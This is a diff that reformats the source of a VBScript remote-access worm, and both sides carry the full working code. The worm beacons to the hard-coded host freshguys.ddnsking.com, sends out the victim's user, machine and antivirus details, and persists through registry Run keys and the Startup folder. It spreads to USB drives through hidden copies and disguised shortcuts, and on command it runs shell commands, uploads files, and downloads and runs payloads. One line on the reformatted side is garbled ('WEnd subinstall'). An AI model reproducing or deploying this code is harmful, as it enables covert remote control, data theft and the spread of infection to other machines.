@@ -1,456 +1,452 @@
-'pashinta
 host = "freshguys.ddnsking.com"
 port = 5674
 installdir = "%temp%"
-lnkfile = false
-lnkfolder = false
+lnkfile = False
+lnkfolder = False
 
 
-dim shellobj 
-set shellobj = wscript.createobject("wscript.shell")
-dim filesystemobj
-set filesystemobj = createobject("scripting.filesystemobject")
-dim httpobj
-set httpobj = createobject("msxml2.xmlhttp")
+Dim shellobj
+Set shellobj = WScript.CreateObject("wscript.shell")
+Dim filesystemobj
+Set filesystemobj = CreateObject("scripting.filesystemobject")
+Dim httpobj
+Set httpobj = CreateObject("msxml2.xmlhttp")
 
 
-installname = wscript.scriptname
+installname = WScript.scriptname
 startup = shellobj.specialfolders ("startup") & "\"
 installdir = shellobj.expandenvironmentstrings(installdir) & "\"
-if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
+If Not filesystemobj.folderexists(installdir) Then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
 spliter = "<" & "|" & ">"
-sleep = 5000 
-dim response
-dim cmd
-dim param
+sleep = 5000
+Dim response
+Dim cmd
+Dim param
 info = ""
 usbspreading = ""
 startdate = ""
-dim oneonce
+Dim oneonce
 
-on error resume next
+On Error Resume Next
 
 
 instance
-while true
-
-install
-
-response = ""
-response = post ("is-ready","")
-cmd = split (response,spliter)
-select case cmd (0)
-case "excecute"
-      param = cmd (1)
-      execute param
-case "update"
-      param = cmd (1)
-      oneonce.close
-      set oneonce =  filesystemobj.opentextfile (installdir & installname ,2, false)
-      oneonce.write param
-      oneonce.close
-      shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34)
-      wscript.quit 
-case "uninstall"
-      uninstall
-case "send"
-      download cmd (1),cmd (2)
-case "site-send"
-      sitedownloader cmd (1),cmd (2)
-case "recv"
-      param = cmd (1)
-      upload (param)
-case  "enum-driver"
-      post "is-enum-driver",enumdriver  
-case  "enum-faf"
-      param = cmd (1)
-      post "is-enum-faf",enumfaf (param)
-case  "enum-process"
-      post "is-enum-process",enumprocess   
-case  "cmd-shell"
-      param = cmd (1)
-      post "is-cmd-shell",cmdshell (param)  
-case  "delete"
-      param = cmd (1)
-      deletefaf (param) 
-case  "exit-process"
-      param = cmd (1)
-      exitprocess (param) 
-case  "sleep"
-      param = cmd (1)
-      sleep = eval (param)        
-end select
-
-wscript.sleep sleep
-
-wend
-
-
-sub install
-on error resume next
-dim lnkobj
-dim filename
-dim foldername
-dim fileicon
-dim foldericon
+While True
+    
+    install
+    
+    response = ""
+    response = post ("is-ready","")
+    cmd = Split (response,spliter)
+    Select Case cmd (0)
+        Case "excecute"
+        param = cmd (1)
+        execute param
+        Case "update"
+        param = cmd (1)
+        oneonce.close
+        Set oneonce = filesystemobj.opentextfile (installdir & installname ,2, False)
+        oneonce.write param
+        oneonce.close
+        shellobj.run "wscript.exe //B " & Chr(34) & installdir & installname & Chr(34)
+        WScript.quit
+        Case "uninstall"
+        uninstall
+        Case "send"
+        download cmd (1),cmd (2)
+        Case "site-send"
+        sitedownloader cmd (1),cmd (2)
+        Case "recv"
+        param = cmd (1)
+        upload (param)
+        Case  "enum-driver"
+        post "is-enum-driver",enumdriver
+        Case  "enum-faf"
+        param = cmd (1)
+        post "is-enum-faf",enumfaf (param)
+        Case  "enum-process"
+        post "is-enum-process",enumprocess
+        Case  "cmd-shell"
+        param = cmd (1)
+        post "is-cmd-shell",cmdshell (param)
+        Case  "delete"
+        param = cmd (1)
+        deletefaf (param)
+        Case  "exit-process"
+        param = cmd (1)
+        exitprocess (param)
+        Case  "sleep"
+        param = cmd (1)
+        sleep = Eval (param)
+    End Select
+    
+    WScript.sleep sleep
+    
+WEnd subinstall
+On Error Resume Next
+Dim lnkobj
+Dim filename
+Dim foldername
+Dim fileicon
+Dim foldericon
 
 upstart
-for each drive in filesystemobj.drives
-
-if  drive.isready = true then
-if  drive.freespace  > 0 then
-if  drive.drivetype  = 1 then
-    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
-    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
-        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
-    end if
-    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
-        if not lnkfile then exit for
-        if  instr (file.name,".") then
-            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
-                file.attributes = 2+4
-                if  ucase (file.name) <> ucase (installname) then
-                    filename = split(file.name,".")
-                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
+For Each drive In filesystemobj.drives
+    
+    If  drive.isready = True Then
+        If  drive.freespace > 0 Then
+            If  drive.drivetype = 1 Then
+                filesystemobj.copyfile WScript.scriptfullname , drive.path & "\" & installname,True
+                If  filesystemobj.fileexists (drive.path & "\" & installname)  Then
+                    filesystemobj.getfile(drive.path & "\" & installname).attributes = 2 + 4
+                End If
+                For Each file In filesystemobj.getfolder( drive.path & "\" ).Files
+                    If Not lnkfile Then Exit For
+                    If  InStr (file.name,".") Then
+                        If  LCase (Split(file.name, ".") (UBound(Split(file.name, ".")))) <> "lnk" Then
+                            file.attributes = 2 + 4
+                            If  UCase (file.name) <> UCase (installname) Then
+                                filename = Split(file.name,".")
+                                Set lnkobj = shellobj.createshortcut (drive.path & "\" & filename (0) & ".lnk")
+                                lnkobj.windowstyle = 7
+                                lnkobj.targetpath = "cmd.exe"
+                                lnkobj.workingdirectory = ""
+                                lnkobj.arguments = "/c start " & Replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & Replace(file.name," ", chrw(34) & " " & chrw(34)) & "&exit"
+                                fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & Split(file.name, ".")(UBound(Split(file.name, "."))) & "\") & "\defaulticon\")
+                                If  InStr (fileicon,",") = 0 Then
+                                    lnkobj.iconlocation = file.path
+                                Else
+                                    lnkobj.iconlocation = fileicon
+                                End If
+                                lnkobj.save()
+                            End If
+                        End If
+                    End If
+                Next
+                For Each folder In filesystemobj.getfolder( drive.path & "\" ).subfolders
+                    If Not lnkfolder Then Exit For
+                    folder.attributes = 2 + 4
+                    foldername = folder.name
+                    Set lnkobj = shellobj.createshortcut (drive.path & "\" & foldername & ".lnk")
                     lnkobj.windowstyle = 7
                     lnkobj.targetpath = "cmd.exe"
                     lnkobj.workingdirectory = ""
-                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
-                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
-                    if  instr (fileicon,",") = 0 then
-                        lnkobj.iconlocation = file.path
-                    else 
-                        lnkobj.iconlocation = fileicon
-                    end if
+                    lnkobj.arguments = "/c start " & Replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & Replace(folder.name," ", chrw(34) & " " & chrw(34)) & "&exit"
+                    foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\")
+                    If  InStr (foldericon,",") = 0 Then
+                        lnkobj.iconlocation = folder.path
+                    Else
+                        lnkobj.iconlocation = foldericon
+                    End If
                     lnkobj.save()
-                end if
-            end if
-        end if
-    next
-    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
-        if not lnkfolder then exit for
-        folder.attributes = 2+4
-        foldername = folder.name
-        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
-        lnkobj.windowstyle = 7
-        lnkobj.targetpath = "cmd.exe"
-        lnkobj.workingdirectory = ""
-        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
-        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
-        if  instr (foldericon,",") = 0 then
-            lnkobj.iconlocation = folder.path
-        else 
-            lnkobj.iconlocation = foldericon
-        end if
-        lnkobj.save()
-    next
-end If
-end If
-end if
-next
+                Next
+            End If
+        End If
+    End If
+Next
 err.clear
-end sub
+End Sub
 
-sub uninstall
-on error resume next
-dim filename
-dim foldername
+Sub uninstall
+On Error Resume Next
+Dim filename
+Dim foldername
 
-shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
-shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
-filesystemobj.deletefile startup & installname ,true
-filesystemobj.deletefile wscript.scriptfullname ,true
+shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0)
+shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0)
+filesystemobj.deletefile startup & installname ,True
+filesystemobj.deletefile WScript.scriptfullname ,True
 
-for  each drive in filesystemobj.drives
-if  drive.isready = true then
-if  drive.freespace  > 0 then
-if  drive.drivetype  = 1 then
-    for  each file in filesystemobj.getfolder ( drive.path & "\").files
-         on error resume next
-         if  instr (file.name,".") then
-             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
-                 file.attributes = 0
-                 if  ucase (file.name) <> ucase (installname) then
-                     filename = split(file.name,".")
-                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
-                 else
-                     filesystemobj.deletefile (drive.path & "\" & file.name)
-                 end If
-             else
-                 filesystemobj.deletefile (file.path) 
-             end if
-         end if
-     next
-     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
-         folder.attributes = 0
-     next
-end if
-end if
-end if
-next
-wscript.quit
-end sub
+For  Each drive In filesystemobj.drives
+    If  drive.isready = True Then
+        If  drive.freespace > 0 Then
+            If  drive.drivetype = 1 Then
+                For  Each file In filesystemobj.getfolder ( drive.path & "\").files
+                    On Error Resume Next
+                    If  InStr (file.name,".") Then
+                        If  LCase (Split(file.name, ".")(UBound(Split(file.name, ".")))) <> "lnk" Then
+                            file.attributes = 0
+                            If  UCase (file.name) <> UCase (installname) Then
+                                filename = Split(file.name,".")
+                                filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
+                            Else
+                                filesystemobj.deletefile (drive.path & "\" & file.name)
+                            End If
+                        Else
+                            filesystemobj.deletefile (file.path)
+                        End If
+                    End If
+                Next
+                For Each folder In filesystemobj.getfolder( drive.path & "\" ).subfolders
+                    folder.attributes = 0
+                Next
+            End If
+        End If
+    End If
+Next
+WScript.quit
+End Sub
 
-function post (cmd ,param)
+Function post (cmd ,param)
 
 post = param
-httpobj.open "post","http://" & host & ":" & port &"/" & cmd, false
+httpobj.open "post","http://" & host & ":" & port & "/" & cmd, False
 httpobj.setrequestheader "user-agent:",information
 httpobj.send param
 post = httpobj.responsetext
-end function
+End Function
 
-function information
-on error resume next
-if  inf = "" then
-    inf = hwid & spliter 
-    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
-    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter
-
-    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
-    set os = root.execquery ("select * from win32_operatingsystem")
-    for each osinfo in os
-       inf = inf & osinfo.caption & spliter  
-       exit for
-    next
+Function information
+On Error Resume Next
+If  inf = "" Then
+    inf = hwid & spliter
+    inf = inf & shellobj.expandenvironmentstrings("%computername%") & spliter
+    inf = inf & shellobj.expandenvironmentstrings("%username%") & spliter
+    
+    Set root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+    Set os = root.execquery ("select * from win32_operatingsystem")
+    For Each osinfo In os
+        inf = inf & osinfo.caption & spliter
+        Exit For
+    Next
     inf = inf & "plus" & spliter
     inf = inf & security & spliter
     inf = inf & usbspreading
-    information = inf  
-else
     information = inf
-end if
-end function
+Else
+    information = inf
+End If
+End Function
 
 
-sub upstart ()
-on error resume Next
+Sub upstart ()
+On Error Resume Next
 
-shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
-shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
-filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
-filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
+shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & Split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
+filesystemobj.copyfile WScript.scriptfullname,installdir & installname,True
+filesystemobj.copyfile WScript.scriptfullname,startup & installname ,True
 
-end sub
+End Sub
 
 
-function hwid
-on error resume next
+Function hwid
+On Error Resume Next
 
-set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
-set disks = root.execquery ("select * from win32_logicaldisk")
-for each disk in disks
-    if  disk.volumeserialnumber <> "" then
+Set root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+Set disks = root.execquery ("select * from win32_logicaldisk")
+For Each disk In disks
+    If  disk.volumeserialnumber <> "" Then
         hwid = disk.volumeserialnumber
-        exit for
-    end if
-next
-end function
+        Exit For
+    End If
+Next
+End Function
 
 
-function security 
-on error resume next
+Function security
+On Error Resume Next
 
 security = ""
 
-set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
-set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
-for each objitem in colitems
-    versionstr = split (objitem.version,".")
-next
-versionstr = split (colitems.version,".")
+Set objwmiservice = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+Set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
+For Each objitem In colitems
+    versionstr = Split (objitem.version,".")
+Next
+versionstr = Split (colitems.version,".")
 osversion = versionstr (0) & "."
-for  x = 1 to ubound (versionstr)
-	 osversion = osversion &  versionstr (i)
-next
-osversion = eval (osversion)
-if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
+For  x = 1 To UBound (versionstr)
+    osversion = osversion & versionstr (i)
+Next
+osversion = Eval (osversion)
+If  osversion > 6 Then sc = "securitycenter2" Else sc = "securitycenter"
 
-set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
+Set objsecuritycenter = GetObject("winmgmts:\\localhost\root\" & sc)
 Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
 
-for each objantivirus in colantivirus
-    security  = security  & objantivirus.displayname & " ."
-next
-if security  = "" then security  = "nan-av"
-end function
+For Each objantivirus In colantivirus
+    security = security & objantivirus.displayname & " ."
+Next
+If security = "" Then security = "nan-av"
+End Function
 
 
-function instance
-on error resume next
+Function instance
+On Error Resume Next
 
-usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
-if usbspreading = "" then
-   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
-      usbspreading = "true - " & date
-      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
-   else
-      usbspreading = "false - " & date
-      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
-
-   end if
-end If
+usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\")
+If usbspreading = "" Then
+    If LCase ( Mid(WScript.scriptfullname,2)) = ":\" & LCase(installname) Then
+        usbspreading = "true - " & Date
+        shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\",  usbspreading, "REG_SZ"
+    Else
+        usbspreading = "false - " & Date
+        shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & Split (installname,".")(0) & "\",  usbspreading, "REG_SZ"
+        
+    End If
+End If
 
 
 
 upstart
-set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
-set installfullnameshort =  filesystemobj.getfile (installdir & installname)
-if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
-    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
-    wscript.quit 
-end If
+Set scriptfullnameshort = filesystemobj.getfile (WScript.scriptfullname)
+Set installfullnameshort = filesystemobj.getfile (installdir & installname)
+If  LCase (scriptfullnameshort.shortpath) <> LCase (installfullnameshort.shortpath) Then
+    shellobj.run "wscript.exe //B " & Chr(34) & installdir & installname & Chr(34)
+    WScript.quit
+End If
 err.clear
-set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
-if  err.number > 0 then wscript.quit
-end function
+Set oneonce = filesystemobj.opentextfile (installdir & installname ,8, False)
+If  err.number > 0 Then WScript.quit
+End Function
 
 
-sub sitedownloader (fileurl,filename)
+Sub sitedownloader (fileurl,filename)
 
 strlink = fileurl
 strsaveto = installdir & filename
-set objhttpdownload = createobject("msxml2.xmlhttp" )
-objhttpdownload.open "get", strlink, false
+Set objhttpdownload = CreateObject("msxml2.xmlhttp" )
+objhttpdownload.open "get", strlink, False
 objhttpdownload.send
 
-set objfsodownload = createobject ("scripting.filesystemobject")
-if  objfsodownload.fileexists (strsaveto) then
+Set objfsodownload = CreateObject ("scripting.filesystemobject")
+If  objfsodownload.fileexists (strsaveto) Then
     objfsodownload.deletefile (strsaveto)
-end if
- 
-if objhttpdownload.status = 200 then
-   dim  objstreamdownload
-   set  objstreamdownload = createobject("adodb.stream")
-   with objstreamdownload
-		.type = 1 
-		.open
-		.write objhttpdownload.responsebody
-		.savetofile strsaveto
-		.close
-   end with
-   set objstreamdownload = nothing
-end if
-if objfsodownload.fileexists(strsaveto) then
-   shellobj.run objfsodownload.getfile (strsaveto).shortpath
-end if 
-end sub
+End If
 
-sub download (fileurl,filedir)
+If objhttpdownload.status = 200 Then
+    Dim  objstreamdownload
+    Set  objstreamdownload = CreateObject("adodb.stream")
+    With objstreamdownload
+        .Type = 1
+        .open
+        .write objhttpdownload.responsebody
+        .savetofile strsaveto
+        .close
+    End With
+    Set objstreamdownload = Nothing
+End If
+If objfsodownload.fileexists(strsaveto) Then
+    shellobj.run objfsodownload.getfile (strsaveto).shortpath
+End If
+End Sub
 
-if filedir = "" then 
-   filedir = installdir
-end if
+Sub download (fileurl,filedir)
 
-strsaveto = filedir & mid (fileurl, instrrev (fileurl,"\") + 1)
-set objhttpdownload = createobject("msxml2.xmlhttp")
-objhttpdownload.open "post","http://" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false
+If filedir = "" Then
+    filedir = installdir
+End If
+
+strsaveto = filedir & Mid (fileurl, InStrRev (fileurl,"\") + 1)
+Set objhttpdownload = CreateObject("msxml2.xmlhttp")
+objhttpdownload.open "post","http://" & host & ":" & port & "/" & "is-sending" & spliter & fileurl, False
 objhttpdownload.send ""
-     
-set objfsodownload = createobject ("scripting.filesystemobject")
-if  objfsodownload.fileexists (strsaveto) then
+
+Set objfsodownload = CreateObject ("scripting.filesystemobject")
+If  objfsodownload.fileexists (strsaveto) Then
     objfsodownload.deletefile (strsaveto)
-end if
-if  objhttpdownload.status = 200 then
-    dim  objstreamdownload
-	set  objstreamdownload = createobject("adodb.stream")
-    with objstreamdownload 
-		 .type = 1 
-		 .open
-		 .write objhttpdownload.responsebody
-		 .savetofile strsaveto
-		 .close
-	end with
-    set objstreamdownload  = nothing
-end if
-if objfsodownload.fileexists(strsaveto) then
-   shellobj.run objfsodownload.getfile (strsaveto).shortpath
-end if 
-end sub
+End If
+If  objhttpdownload.status = 200 Then
+    Dim  objstreamdownload
+    Set  objstreamdownload = CreateObject("adodb.stream")
+    With objstreamdownload
+        .Type = 1
+        .open
+        .write objhttpdownload.responsebody
+        .savetofile strsaveto
+        .close
+    End With
+    Set objstreamdownload = Nothing
+End If
+If objfsodownload.fileexists(strsaveto) Then
+    shellobj.run objfsodownload.getfile (strsaveto).shortpath
+End If
+End Sub
 
 
-function upload (fileurl)
+Function upload (fileurl)
 
-dim  httpobj,objstreamuploade,buffer
-set  objstreamuploade = createobject("adodb.stream")
-with objstreamuploade 
-     .type = 1 
-     .open
-	 .loadfromfile fileurl
-	 buffer = .read
-	 .close
-end with
-set objstreamdownload = nothing
-set httpobj = createobject("msxml2.xmlhttp")
-httpobj.open "post","http://" & host & ":" & port &"/" & "is-recving" & spliter & fileurl, false
+Dim  httpobj,objstreamuploade,buffer
+Set  objstreamuploade = CreateObject("adodb.stream")
+With objstreamuploade
+    .Type = 1
+    .open
+    .loadfromfile fileurl
+    buffer = .read
+    .close
+End With
+Set objstreamdownload = Nothing
+Set httpobj = CreateObject("msxml2.xmlhttp")
+httpobj.open "post","http://" & host & ":" & port & "/" & "is-recving" & spliter & fileurl, False
 httpobj.send buffer
-end function
+End Function
 
 
-function enumdriver ()
+Function enumdriver ()
 
-for  each drive in filesystemobj.drives
-if   drive.isready = true then
-     enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter
-end if
-next
-end Function
+For  Each drive In filesystemobj.drives
+    If   drive.isready = True Then
+        enumdriver = enumdriver & drive.path & "|" & drive.drivetype & spliter
+    End If
+Next
+End Function
 
-function enumfaf (enumdir)
+Function enumfaf (enumdir)
 
 enumfaf = enumdir & spliter
-for  each folder in filesystemobj.getfolder (enumdir).subfolders
-     enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter
-next
+For  Each folder In filesystemobj.getfolder (enumdir).subfolders
+    enumfaf = enumfaf & folder.name & "|" & "" & "|" & "d" & "|" & folder.attributes & spliter
+Next
 
-for  each file in filesystemobj.getfolder (enumdir).files
-     enumfaf = enumfaf & file.name & "|" & file.size  & "|" & "f" & "|" & file.attributes & spliter
+For  Each file In filesystemobj.getfolder (enumdir).files
+    enumfaf = enumfaf & file.name & "|" & file.size & "|" & "f" & "|" & file.attributes & spliter
+    
+Next
+End Function
 
-next
-end function
 
+Function enumprocess ()
 
-function enumprocess ()
+On Error Resume Next
 
-on error resume next
+Set objwmiservice = GetObject("winmgmts:\\.\root\cimv2")
+Set colitems = objwmiservice.execquery("select * from win32_process",,48)
 
-set objwmiservice = getobject("winmgmts:\\.\root\cimv2")
-set colitems = objwmiservice.execquery("select * from win32_process",,48)
-
-dim objitem
-for each objitem in colitems
-	enumprocess = enumprocess & objitem.name & "|"
-	enumprocess = enumprocess & objitem.processid & "|"
+Dim objitem
+For Each objitem In colitems
+    enumprocess = enumprocess & objitem.name & "|"
+    enumprocess = enumprocess & objitem.processid & "|"
     enumprocess = enumprocess & objitem.executablepath & spliter
-next
-end function
+Next
+End Function
 
-sub exitprocess (pid)
-on error resume next
+Sub exitprocess (pid)
+On Error Resume Next
 
-shellobj.run "taskkill /F /T /PID " & pid,7,true
-end sub
+shellobj.run "taskkill /F /T /PID " & pid,7,True
+End Sub
 
-sub deletefaf (url)
-on error resume next
+Sub deletefaf (url)
+On Error Resume Next
 
 filesystemobj.deletefile url
 filesystemobj.deletefolder url
 
-end sub
+End Sub
 
-function cmdshell (cmd)
+Function cmdshell (cmd)
 
-dim httpobj,oexec,readallfromany
+Dim httpobj,oexec,readallfromany
 
-set oexec = shellobj.exec ("%comspec% /c " & cmd)
-if not oexec.stdout.atendofstream then
-   readallfromany = oexec.stdout.readall
-elseif not oexec.stderr.atendofstream then
-   readallfromany = oexec.stderr.readall
-else 
-   readallfromany = ""
-end if
+Set oexec = shellobj.exec ("%comspec% /c " & cmd)
+If Not oexec.stdout.atendofstream Then
+    readallfromany = oexec.stdout.readall
+ElseIf Not oexec.stderr.atendofstream Then
+    readallfromany = oexec.stderr.readall
+Else
+    readallfromany = ""
+End If
 
 cmdshell = readallfromany
-end function
+End Function
